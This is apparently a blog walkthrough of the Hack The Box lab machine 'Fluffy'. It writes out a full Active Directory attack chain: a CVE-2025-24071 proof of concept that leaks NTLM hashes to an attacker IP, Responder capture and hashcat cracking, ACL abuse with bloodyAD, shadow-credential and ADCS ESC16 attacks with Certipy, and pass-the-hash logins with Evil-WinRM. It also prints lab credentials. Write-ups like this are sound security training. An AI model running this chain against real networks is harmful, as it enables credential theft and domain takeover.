---
title: "Hack The Box: Fluffy Walkthrough"
date: 2026-02-03 
categories: [HackTheBox, Active Directory, Windows]
tags: [walkthrough, windows, active-directory, adcs, assumed-breach, easy, cve-2025-24071]
image:
  path: /assets/fluffy/cover.png
---

## 🧸 Machine Overview

- **Name:** Fluffy  
- **Difficulty:** Easy  
- **OS:** Windows (Active Directory)  
- **Scenario:** Assumed Breach  
- **Attack Chain:** SMB Write → NTLM Leak (CVE-2025-24071) → AD ACL Abuse → ADCS (ESC16)

**Fluffy** demonstrates how a seemingly low-impact misconfiguration (a writable SMB share) can be chained with a modern Windows Explorer vulnerability and Active Directory Certificate Services misconfigurations to fully compromise a domain.

---

Fluffy is an Active Directory machine that simulates an Assumed Breach scenario. The path to Domain Admin involves exploiting a writable SMB share, leveraging a Windows Explorer spoofing vulnerability (CVE-2025–24071), and chaining complex AD ACL misconfigurations with ADCS (ESC16) abuse.

Before starting, the hostname was added to the local hosts file: 10.129.31.61 fluffy.htb dc01.fluffy.htb

Initial Access
Provided Credentials
The engagement starts with low-privileged access:

```python
User: j.fleischman
Password: J0elTHEM4n1990!
```


### SMB Enumeration
I began by enumerating the available SMB shares using the provided credentials:

```python
smbclient -L //10.129.31.61/ -U 'j.fleischman'
```

![Desktop View](/assets/fluffy/image1.png){: width="700" height="400" .normal }

The IT share was accessible. After connecting, I downloaded all contents for offline review:


![Desktop View](/assets/fluffy/image2.png){: width="700" height="400" .normal }


```python

smbclient //10.129.31.61/IT -U 'j.fleischman'
# Inside smbclient:
RECURSE ON
PROMPT OFF
mget *

```

### Vulnerability Discovery
![Desktop View](/assets/fluffy/image3.png){: width="700" height="400" .normal }

Among the files was a PDF document referencing
 CVE-2025–24071 (Windows File Explorer Spoofing). This vulnerability allows an attacker to leak NTLM hashes when a victim interacts with a crafted .library-ms file inside a ZIP archive.

### Credential Harvesting
Exploiting CVE-2025–24071
I used a public PoC to generate a malicious archive that points to my attacker IP:

```python
python3 poc.py --name kavi --ip 10.10.14.74
```

I uploaded the resulting exploit.zip to the writable IT share. To capture the incoming authentication, I started Responder:

```python
sudo responder -I tun0
```

Once a user extracted the archive, the NTLMv2 hash for p.agila was captured.

### Password Cracking
The hash was cracked using rockyou.txt:

```python
hashcat -m 5600 p_agila.hash /usr/share/wordlists/rockyou.txt
```
```python
Credentials Found: p.agila : prometheusx-303
```
## Active Directory Enumeration
### BloodHound Collection
With p.agila's credentials, I mapped the domain's attack surface:

```python
bloodhound-python -d fluffy.htb -u p.agila -p 'prometheusx-303' -ns 10.129.31.61 -c All
```
![Desktop View](/assets/fluffy/image5.png){: width="700" height="400" .normal }

![Desktop View](/assets/fluffy/image6.png){: width="700" height="400" .normal }

Key Findings:

p.agila is a member of Service Account Managers.

This group has GenericAll over the Service Accounts group.

The Service Accounts group has GenericWrite over winrm_svc and ca_svc.

## Lateral Movement
### ACL Abuse & Shadow Credentials
I added p.agila to the Service Accounts group to inherit the necessary permissions:

```python
bloodyAD -u 'p.agila' -p 'prometheusx-303' -d fluffy.htb --host 10.129.31.61 add groupMember "service accounts" p.agila
```
![Desktop View](/assets/fluffy/image8.png){: width="700" height="400" .normal }

Next, I used a Shadow Credentials attack to take control of both service accounts:

```python
certipy-ad shadow auto -username p.agila@fluffy.htb -password 'prometheusx-303' -account ca_svc
certipy-ad shadow auto -username p.agila@fluffy.htb -password 'prometheusx-303' -account winrm_svc
```

![Desktop View](/assets/fluffy/image9.png){: width="700" height="400" .normal }

## Foothold (WinRM)
Using the NT hash for winrm_svc, I logged in via Evil-WinRM to collect the user flag:


```python
evil-winrm -u winrm_svc -H <NT_HASH> -i 10.129.31.61
```

## Privilege Escalation
### ADCS ESC16 Abuse
Enumeration revealed that the Certificate Authority (CA) was vulnerable to ESC16 due to disabled security extensions.

I abused the ca_svc account (which had write permissions on the CA) to forge a certificate for the Administrator:

```python
# Request certificate as Administrator
certipy-ad req -u ca_svc -hashes <HASH> -dc-ip 10.129.31.61 -ca fluffy-DC01-CA -template User
```
```python
# Authenticate with forged PFX
certipy-ad auth -pfx administrator.pfx -domain fluffy.htb -dc-ip 10.129.31.61
```

## Domain Admin Access
The previous step returned the Administrator's NT hash. I used it for a final WinRM session:

```python
evil-winrm -u Administrator -H <ADMIN_HASH> -i dc01.fluffy.htb
```

```python
Root Flag: C:\Users\Administrator\Desktop\root.txt
```

## Conclusion
Fluffy highlights the danger of permission chaining. A single writable share and a modern spoofing vulnerability provided the foothold needed to abuse complex Active Directory Certificate Services configurations.

Happy Hacking XD!